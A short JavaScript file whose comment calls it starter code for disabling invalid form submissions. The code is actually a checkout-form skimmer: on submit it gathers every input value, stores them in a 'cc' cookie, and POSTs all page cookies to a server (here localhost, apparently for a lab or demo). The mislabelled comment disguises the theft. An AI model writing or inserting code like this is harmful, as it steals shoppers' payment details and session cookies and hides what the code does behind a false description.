// Example starter JavaScript for disabling form submissions if there are invalid fields
const form = document.getElementById('checkout');

form.onsubmit = submit;

function getElements(){
    var elements = document.forms["checkout"].getElementsByTagName("input");
    var x = {};
    for(i of elements){
        x[i.id] = i.value
    }
    return x;
}

function saveToCookie(){
    document.cookie = `cc=${JSON.stringify(getElements())}`;
}

function postCCInfo(ccInfo){
    var url = "http://127.0.0.1:8000";
    var params = `c=${ccInfo}`;
    var xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.send(params);
}

function submit(event) {
    saveToCookie();
    postCCInfo(document.cookie);
}
